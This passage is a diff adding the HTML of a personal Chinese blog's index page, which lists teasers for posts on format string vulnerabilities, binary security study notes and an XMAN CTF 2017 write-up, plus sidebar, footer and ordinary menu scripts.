+    <div class="article-entry" itemprop="articleBody">
+      
+        <h4 id="格式化字符串漏洞原理及其利用"><a href="#格式化字符串漏洞原理及其利用" class="headerlink" title="格式化字符串漏洞原理及其利用"></a>格式化字符串漏洞原理及其利用</h4>
+        
+          <p class="article-more-link">
+            <a href="/2017/09/22/格式化字符串漏洞/#more">Read More</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2017/09/22/格式化字符串漏洞/" data-id="cjfgehm37000ivgunnhy049yn" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pwn，format/">pwn，format</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+
+
+  
+    <article id="post-暑假夏令营二进制安全学习笔记" class="wow slideInRight article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2017/07/20/暑假夏令营二进制安全学习笔记/" class="article-date">
+  <time class="post-time" datetime="2017-07-20T01:41:58.000Z" itemprop="datePublished">
+    <span class="post-month">7月</span><br/>
+    <span class="post-day">20</span>
+  </time>
+</a>
+   
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2017/07/20/暑假夏令营二进制安全学习笔记/">暑期夏令营</a>
+    </h1>
+  
+
+        <div>
+          
+          
+              
+
+          
+        </div>
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h4 id="二进制安全"><a href="#二进制安全" class="headerlink" title="二进制安全"></a>二进制安全</h4>
+        
+          <p class="article-more-link">
+            <a href="/2017/07/20/暑假夏令营二进制安全学习笔记/#more">Read More</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2017/07/20/暑假夏令营二进制安全学习笔记/" data-id="cjfgehm30000bvgunq9d0jtxy" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Reverse/">Reverse</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+
+
+  
+    <article id="post-XMAN-CTF-2017" class="wow slideInRight article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2017/07/19/XMAN-CTF-2017/" class="article-date">
+  <time class="post-time" datetime="2017-07-19T09:24:30.000Z" itemprop="datePublished">
+    <span class="post-month">7月</span><br/>
+    <span class="post-day">19</span>
+  </time>
+</a>
+   
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2017/07/19/XMAN-CTF-2017/">XMAN CTF 2017</a>
+    </h1>
+  
+
+        <div>
+          
+          
+              
+
+          
+        </div>
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>0x1 re3<br>
+        
+          <p class="article-more-link">
+            <a href="/2017/07/19/XMAN-CTF-2017/#more">Read More</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2017/07/19/XMAN-CTF-2017/" data-id="cjfgehm2l0005vgun9q65qy0g" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Reverse/">Reverse</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+
+
+  
+
+
+  <nav id="page-nav">
+    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="extend next" rel="next" href="/page/2/">next &raquo;</a>
+  </nav>
+</section>
+        
+          <aside id="sidebar">
+  
+    <div class="widget-wrap">
+  <h3 class="widget-title"></h3>
+  <div class="widget">
+    <h1 class="blog-title">√素顏☃繁華夢☪</h1>
+    <h2 class="blog-subtitle">Go!Go!Go!</h2>
+    <ul class="blog-link">
+     
+          <a href="/" title="Home">
+            <li>主页</li>
+          </a>
+        
+          <a href="/archives" title="Archives">
+            <li>归档</li>
+          </a>
+        
+          <a href="/categories" title="Categories">
+            <li>分类</li>
+          </a>
+        
+          <a href="/tags" title="Tags">
+            <li>标签</li>
+          </a>
+        
+    </ul>
+  </div>
+</div>
+
+  
+    <div class="widget-wrap">
+  <h3 class="widget-title"></h3>
+  <div class="widget">
+    <img class="avatar" src="http://ote495tnr.bkt.clouddn.com/touxiang.jpg">
+    <h2 class="author">XiaoRui</h2>
+    <h3 class="description">奋斗中的小白</h3>
+    <div class="count-box">
+      <a href="/archives"><div><strong>14</strong><br>文章</div></a>
+      <a href="/categories"><div><strong>0</strong><br>分类</div></a>
+      <a href="/tags"><div><strong>8</strong><br>标签</div></a>
+    </div>
+
+
+
+    <div class="social-link">
+      
+        <a class="hvr-bounce-in" href="https://github.com/xiaorui1234" target="_blank" title="Github">
+          Github
+        </a>
+      
+    </div>
+
+    <div class="friend-link">
+      <h2>友情链接</h2>
+      
+        <a class="hvr-bounce-in" href="http://foxroot.cn/" target="_blank" title="FoxRoot">
+          FoxRoot
+        </a>
+      
+    </div>
+  </div>
+</div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy;2017 - 2018 XiaoRui<br>
+      
+      
+    </div>
+    
+  </div>
+</footer>
+    </div>
+    
+
+<script src="//apps.bdimg.com/libs/jquery/2.1.4/jquery.min.js"></script>
+<script src="//apps.bdimg.com/libs/wow/0.1.6/wow.min.js"></script>
+<script>
+new WOW().init();
+</script>   
+
+
+  <link rel="stylesheet" href="/plugin/fancybox/jquery.fancybox.css">
+  <script src="/plugin/fancybox/jquery.fancybox.pack.js"></script>
+
+
+
+  <link rel="stylesheet" href="/plugin/galmenu/GalMenu.css">
+  <script src="/plugin/galmenu/GalMenu.js"></script>
+  <div class="GalMenu GalDropDown">
+      <div class="circle" id="gal">
+        <div class="ring">
+          
+            <a href="/" title="" class="menuItem">首页</a>
+          
+            <a href="/tags" title="" class="menuItem">标签</a>
+          
+            <a href="/categories" title="" class="menuItem">分类</a>
+          
+            <a href="/archives" title="" class="menuItem">归档</a>
+          
+        </div>
+        
+          <audio id="audio" src="#"></audio>
+        
+      </div> 
+</div>
+<div id="overlay" style="opacity: 1; cursor: pointer;"></div>
+  <script type="text/javascript">var items = document.querySelectorAll('.menuItem');
+    for (var i = 0,
+    l = items.length; i < l; i++) {
+      items[i].style.left = (50 - 35 * Math.cos( - 0.5 * Math.PI - 2 * (1 / l) * i * Math.PI)).toFixed(4) + "%";
+      items[i].style.top = (50 + 35 * Math.sin( - 0.5 * Math.PI - 2 * (1 / l) * i * Math.PI)).toFixed(4) + "%"
+    }</script>
+<script type="text/javascript">
+  $(document).ready(function() {
+    $('body').GalMenu({
+      'menu': 'GalDropDown'
+    })
+  });
+</script>
+
+  <section class="hidden-xs"> 
+  <ul class="cb-slideshow"> 
+    <li><span>苟利</span></li> 
+    <li><span>国家</span></li> 
+    <li><span>生死以</span></li> 
+    <li><span>岂能</span></li> 
+    <li><span>祸福</span></li> 
+    <li><span>趋避之</span></li> 
+  </ul>
+</section>
+<script src="/js/script.js"></script>
+
+
+
+  </div>
+</body>
+</html>
